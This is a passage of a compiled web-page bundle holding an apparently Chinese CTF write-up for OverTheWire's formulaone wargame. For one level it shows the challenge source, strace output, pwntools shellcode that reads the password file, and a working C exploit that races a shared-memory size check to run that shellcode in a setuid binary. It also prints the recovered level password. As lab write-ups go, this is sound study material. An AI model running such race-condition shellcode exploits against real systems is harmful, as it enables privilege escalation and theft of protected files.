\u8d26\u6237"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"ssh formulaone2@formulaone.labs.overthewire.org -p 2232\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u67e5\u770b\u6311\u6218"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",metastring:'title="/formulaone/formulaone3.c"',children:'/*\'09 codegate chal\nPROVE YOUR MIGHT\n*/\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <linux/shm.h>\n#include <time.h>\n\nunsigned int keys[] = {0xADCADC00, 0xADC00ADC, 0x00ADCADC, 0x0ADCADC0};\nunsigned int SHMKEY;\n\nstruct msg\n{\n    int sz;\n    char ptr[1024];\n} msg;\n\nstruct msg *echo;\n\nvoid doecho()\n{\n    int shmid;\n    char buf[256];\n    shmid = shmget(SHMKEY, 8192, IPC_CREAT | 0777);\n    echo = shmat(shmid, NULL, SHM_EXEC);\n\n    if (echo->sz)\n    {\n        if (echo->sz < sizeof(buf))\n        {\n            printf("The msg is...\\n");\n            memcpy(buf, echo->ptr, echo->sz);\n            printf("%s\\n", buf);\n        }\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    if (!argv[1])\n        return 0;\n    SHMKEY = keys[argv[1][0] & 3];\n    doecho();\n}\n'})}),"\n",(0,a.jsxs)(e.p,{children:["\u9996\u5148\uff0c\u5148\u5c1d\u8bd5\u4f7f\u7528 ",(0,a.jsx)(e.code,{children:"strace"})," \u8ddf\u8e2a\u7a0b\u5e8f\u6267\u884c\uff0c\u4e0d\u5e26\u4efb\u4f55\u53c2\u6570\u6267\u884c\u4e00\u6b21"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:'formulaone2@bandit:/formulaone$ strace /formulaone/formulaone3\nexecve("/formulaone/formulaone3", ["/formulaone/formulaone3"], 0x7fffffffe340 /* 27 vars */) = 0\n[Process PID=1790473 runs in 32 bit mode.]\nbrk(NULL)                               = 0x804d000\nfcntl64(0, F_GETFD)                     = 0\nfcntl64(1, F_GETFD)                     = 0\nfcntl64(2, F_GETFD)                     = 0\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fc1000\naccess("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)\nopenat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3\nstatx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0644, stx_size=31699, ...}) = 0\nmmap2(NULL, 31699, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fb9000\nclose(3)                                = 0\nopenat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3\nread(3, "\\177ELF\\1\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\0O\\2\\0004\\0\\0\\0"..., 512) = 512\nstatx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0755, stx_size=2313128, ...}) = 0\nmmap2(NULL, 2341052, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d7d000\nmmap2(0xf7da0000, 1601536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0xf7da0000\nmmap2(0xf7f27000, 544768, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1aa000) = 0xf7f27000\nmmap2(0xf7fac000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22f000) = 0xf7fac000\nmmap2(0xf7faf000, 39100, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7faf000\nclose(3)                                = 0\nset_thread_area({entry_number=-1, base_addr=0xf7fc24c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)\nset_tid_address(0xf7fc2528)             = 1790473\nset_robust_list(0xf7fc252c, 12)         = 0\nrseq(0xf7fc2960, 0x20, 0, 0x53053053)   = 0\nmprotect(0xf7fac000, 8192, PROT_READ)   = 0\nmprotect(0x804b000, 4096, PROT_READ)    = 0\nmprotect(0xf7ffb000, 8192, PROT_READ)   = 0\nugetrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0\nmunmap(0xf7fb9000, 31699)               = 0\nexit_group(0)                           = ?\n+++ exited with 0 +++\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u7136\u540e\u5e26\u4e0a\u4e00\u4e2a\u53c2\u6570\u6267\u884c\u4e00\u6b21"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:'formulaone2@bandit:/formulaone$ strace /formulaone/formulaone3 abc\nexecve("/formulaone/formulaone3", ["/formulaone/formulaone3", "abc"], 0x7fffffffe338 /* 27 vars */) = 0\n[Process PID=1790503 runs in 32 bit mode.]\nbrk(NULL)                               = 0x804d000\nfcntl64(0, F_GETFD)                     = 0\nfcntl64(1, F_GETFD)                     = 0\nfcntl64(2, F_GETFD)                     = 0\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fc1000\naccess("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)\nopenat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3\nstatx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0644, stx_size=31699, ...}) = 0\nmmap2(NULL, 31699, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fb9000\nclose(3)                                = 0\nopenat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3\nread(3, "\\177ELF\\1\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\0O\\2\\0004\\0\\0\\0"..., 512) = 512\nstatx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0755, stx_size=2313128, ...}) = 0\nmmap2(NULL, 2341052, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d7d000\nmmap2(0xf7da0000, 1601536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0xf7da0000\nmmap2(0xf7f27000, 544768, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1aa000) = 0xf7f27000\nmmap2(0xf7fac000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22f000) = 0xf7fac000\nmmap2(0xf7faf000, 39100, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7faf000\nclose(3)                                = 0\nset_thread_area({entry_number=-1, base_addr=0xf7fc24c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)\nset_tid_address(0xf7fc2528)             = 1790503\nset_robust_list(0xf7fc252c, 12)         = 0\nrseq(0xf7fc2960, 0x20, 0, 0x53053053)   = 0\nmprotect(0xf7fac000, 8192, PROT_READ)   = 0\nmprotect(0x804b000, 4096, PROT_READ)    = 0\nmprotect(0xf7ffb000, 8192, PROT_READ)   = 0\nugetrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0\nmunmap(0xf7fb9000, 31699)               = 0\nshmget(0xadc00adc, 8192, IPC_CREAT|0777) = 0\nshmat(0, NULL, SHM_EXEC)                = 0xf7fbf000\nexit_group(0)                           = ?\n+++ exited with 0 +++\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u5f88\u660e\u663e\uff0c\u591a\u4e86\u51e0\u6b65"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"shmget(0xadc00adc, 8192, IPC_CREAT|0777) = 0\nshmat(0, NULL, SHM_EXEC)                = 0xf7fbf000\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u7ed3\u5408\u6e90\u7801\u6765\u770b\uff0c\u5176\u903b\u8f91\u7528 python \u8868\u8fbe\u5c31\u662f"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-python",children:'[0xADCADC00, 0xADC00ADC, 0x00ADCADC, 0x0ADCADC0][ord("abc"[0]) & 3] == 0xADC00ADC\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u90a3\u4e48\u8bf4\u660e\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u4ece 4 \u4e2a\u5171\u4eab\u5185\u5b58\u4e2d\u8bfb\u53d6\u6570\u636e"}),"\n",(0,a.jsx)(e.p,{children:"\u5e76\u4e14\u68c0\u67e5\u7a0b\u5e8f\u7684\u4fdd\u62a4\u63aa\u65bd"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"formulaone2@bandit:/tmp/randark/formulaone-3$ checksec --dir=/formulaone | grep formulaone3\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified     Fortifiable    Filename\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   46 Symbols      No       0             1              /formulaone/formulaone3-hard\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   45 Symbols      No       0             1              /formulaone/formulaone3\n\nformulaone2@bandit:/tmp/randark/formulaone-3$ file /formulaone/formulaone3*\n/formulaone/formulaone3:      setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=7fd7ce5e151e4e6d79f6f3d6314fc62f7730743e, for GNU/Linux 3.2.0, not stripped\n/formulaone/formulaone3.c:    C source, ASCII text\n/formulaone/formulaone3-hard: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a570311fc5a726677c240a0e7dcf7cb3388fa4e1, for GNU/Linux 3.2.0, not stripped\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u53ef\u4ee5\u770b\u5230\uff0c\u5173\u95ed\u4e86 ",(0,a.jsx)(e.code,{children:"Canary"})," \u4fdd\u62a4\uff0c\u53ef\u4ee5\u8003\u8651 ",(0,a.jsx)(e.code,{children:"ret2shellcode"})]}),"\n",(0,a.jsxs)(e.p,{children:["\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u73af\u5883\u53ea\u662f\u63d0\u4f9b\u4e86 ",(0,a.jsx)(e.code,{children:"suid"})," \u6743\u9650\uff0c\u90a3\u4e48\u5373\u4f7f getshell \u4e4b\u540e\uff0c\u4e5f\u65e0\u6cd5\u76f4\u63a5\u5207\u6362\u5230 ",(0,a.jsx)(e.code,{children:"formulaone3"})," \u7528\u6237\u3002\u90a3\u4e48\u76ee\u6807\u5c31\u5f88\u660e\u786e\u4e86\uff0c\u76f4\u63a5\u6253\u6587\u4ef6\u8bfb\u53d6\u5373\u53ef"]}),"\n",(0,a.jsx)(e.p,{children:"\u9996\u5148\uff0c\u5148\u751f\u6210 shellcode"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-python",children:"from pwn import *\n\npayload = asm(shellcraft.cat('/etc/formulaone_pass/formulaone3'))\n\nprint(list(payload))\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u5f97\u5230 shellcode \u4e4b\u540e\uff0c\u4ece\u5171\u4eab\u5185\u5b58\u90e8\u5206\u4e0b\u624b\uff0c\u5199\u5165 shellcode \u8fdb ",(0,a.jsx)(e.code,{children:"msg->ptr"})," \u7684\u540c\u65f6\uff0c\u6ee1\u8db3\u6761\u4ef6\u7ade\u4e89"]}),"\n",(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.code,{children:"echo->sz"})," \u5148\u4fdd\u8bc1\u5c0f\u4e8e ",(0,a.jsx)(e.code,{children:"buf"})," \u7684\u957f\u5ea6\uff0c\u901a\u8fc7\u957f\u5ea6\u68c0\u67e5\uff0c\u7136\u540e\u6539 ",(0,a.jsx)(e.code,{children:"echo->sz"})," \u4e3a\u80fd\u5b8c\u6574\u8bfb\u53d6 ",(0,a.jsx)(e.code,{children:"shellcode"})," \u7684\u503c\uff0c\u8fdb\u800c\u53ef\u4ee5\u52a0\u8f7d shellcode"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",children:"/*'09 codegate chal\nPROVE YOUR MIGHT\n*/\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/shm.h>\n#include <sys/sem.h>\n#include <unistd.h>\n\nunsigned int keys[] = {0xADCADC00, 0xADC00ADC, 0x00ADCADC, 0x0ADCADC0};\nunsigned int SHMKEY;\n\nstruct msg\n{\n    int sz;\n    int ptr[1024 / 4];\n} msg;\n\nstruct msg *echo;\n\nint main(int argc, char *argv[])\n{\n    SHMKEY = keys[0];\n    int shmid;\n\n    unsigned char *base;\n    unsigned char *target;\n\n    shmid = shmget(SHMKEY, 8192, IPC_CREAT | 0777);\n    echo = shmat(shmid, NULL, SHM_EXEC);\n\n    memset(echo, 0x90, 0x200);\n\n    // struct shmid_ds buf1;\n    // shmctl(shmid, IPC_STAT, &buf1);\n    // buf1.shm_perm.mode = 0222; // \u8bbe\u7f6e\u65b0\u6743\u9650\u4e3a 0600\uff08\u4ec5\u6240\u6709\u8005\u53ef\u8bfb\u5199\uff09\n    // shmctl(shmid, IPC_SET, &buf1);\n    // shmctl(shmid, IPC_RMID, NULL);\n\n    unsigned char shellcode[] = {\n        // Shellcode\n    };\n    base = (unsigned char *)echo;\n    target = base + 0x20;\n    memcpy(target, shellcode, sizeof(shellcode));\n\n    target = base + 0x110;\n    ((int *)target)[0] = 0x804C484 - 4; // echo address\n    ((int *)target)[1] = 0x8049238;     // leave ret\n\n    // \u7ade\u4e89\u5224\u65ad\u6761\u4ef6\n    while (1)\n    {\n        echo->sz = 0xff;\n        echo->sz = 0x2eb;\n        echo->sz = 0x2eb;\n    }\n}\n\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u5f00\u4e24\u4e2a SSH \u4f1a\u8bdd\uff0c\u5404\u81ea\u6267\u884c"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"# compiled from c code above\n./exp\n\nfor i in $(seq 1000);do echo $i; /formulaone/formulaone3 D ;done\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u5e94\u8be5\u5728 10 \u6b21\u5faa\u73af\u5185\u6210\u529f\uff08\u7ade\u4e89\u770b\u8fd0\u6c14\uff09"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{alt:"img",src:r(17860).A+"",width:"2560",height:"1540"})}),"\n",(0,a.jsxs)(e.p,{children:["\u5373\u53ef\u786e\u5b9a\u6700\u7ec8\u7684\u5bc6\u7801\u4e3a ",(0,a.jsx)(e.code,{children:"Liqb5fEvP7IjKWZpoFOdYfQT494msxyv"})]}),"\n",(0,a.jsx)(e.h2,{id:"level-3---level-5",children:"Level 3 -> Level 5"}),"\n",(0,a.jsxs)(e.p,{children:["\u767b\u5f55 ",(0,a.jsx)(e.code,{children:"Level 3"})," \u8d26\u6237"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"ssh formulaone3@formulaone.labs.overthewire.org -p 2232\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u67e5\u770b\u6311\u6218\u7684\u4ee3\u7801"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",children:'/*\n * -(nemo1.c)-\n * by nemo 2005\n *\n * v0.2\n *\n * Bit of fun, for #social.\n *\n * Thanks to hawkes for working on this with me\n * to make it exploitable.\n *\n * http://www.pulltheplug.org (now overthewire.org)\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <signal.h>\n#include <string.h>\n\n#define NBUFSIZ 1024\n\nchar *buf, *brrr;\nvoid (*mfptrr)();\nchar buf2[NBUFSIZ];\n\nvoid func1(char *arg)\n{\n    char envar[NBUFSIZ + 1];\n    strncpy(envar, arg, NBUFSIZ);\n    envar[NBUFSIZ] = 0;\n    printf("[*] Environment variable: %s\\n", envar);\n    return;\n}\n\nvoid int_handler()\n{\n    if (strlen(buf) >= NBUFSIZ - 1)\n    {\n        exit(1);\n    }\n\n    memcpy(buf2, buf, strlen(buf) - 1);\n    printf("[+] Local buffer: %s.\\n", buf2);\n\n    mfptrr(0);\n}\n\nvoid cont_handler()\n{\n    printf("[+] :D\\n");\n\n    mfptrr(0);\n}\n\nvoid check_main(char **av)\n{\n    int a, b, c;\n    char *home;\n    long key;\n\n    if (home = getenv("HOME"))\n    {\n        if (home[1])\n        {\n            a = rand();\n            b = (int)home[0];\n            c = (int)home[1];\n            key = a + b + c;\n        }\n    }\n    if (key == 0xdeadbeef)\n    {\n        signal(SIGINT, int_handler);\n        signal(SIGCONT, cont_handler);\n\n        if (getenv("TIMER"))\n            sleep(1); // weak :P\n\n        buf = malloc(NBUFSIZ + 1);\n        strncpy(buf, av[1], NBUFSIZ);\n        buf[NBUFSIZ] = 0;\n    }\n\n    return;\n}\n\nint main(int ac, char **av, char **env)\n{\n    char **tmp = env, *loc_brrr;\n    mfptrr = exit;\n\n    srand(0xcafebabe);\n\n    if ((long)&buf2 > (long)&mfptrr)\n    {\n        printf("[!] Sorry, it\'s unlikely you can exploit this with your version of gcc.\\n");\n        printf("[!] feel free to remove this check, and let me know if you get it working.\\n");\n        exit(1);\n    }\n\n    if (getenv("BUFFER"))\n        buf = strdup(getenv("BUFFER"));\n\n    if (getenv("TERM"))\n        brrr = strdup(getenv("TERM"));\n\n    while (*(++tmp))\n        func1(*tmp);\n\n    check_main(av);\n\n    return 1;\n}\n'})}),"\n",(0,a.jsx)(e.p,{children:"TODO \u63a5\u4e0b\u6765\u5b8c\u5168\u6ca1\u6709\u53ef\u5229\u7528\u7684\u53ef\u80fd\u6027"})]})}function m(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(d,{...n})}):d(n)}},52255:(n,e,r)=>{r.d(e,{A:()=>s});const s=r.p+"assets/images/image_20250104-220456-7eedf95e7a5e5727b524fb1dceabe597.png"},17860:(n,e,r)=>{r.d(e,{A:()=>s});const s=r.p+"assets/images/image_20250118-161823-74d30984a8d965f133fdf9b63314af9d.png"},63302:(n,e,r)=>{r.d(e,{A:()=>s});const s=r.p+"assets/images/image_20250123-202322-7853f996fcb9917fa47fa4703b407fc1.png"},78039:(n,e,r)=>{r.d(e,{A:()=>s});const s=r.p+"assets/images/image_20250142-194236-cda4cfc8eb7c5ee463ecec54acfbc7a1.png"},28453:(n,e,r)=>{r.d(e,{R:()=>o,x:()=>l});var s=r(96540);const a={},i=s.createContext(a);function o(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:o(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);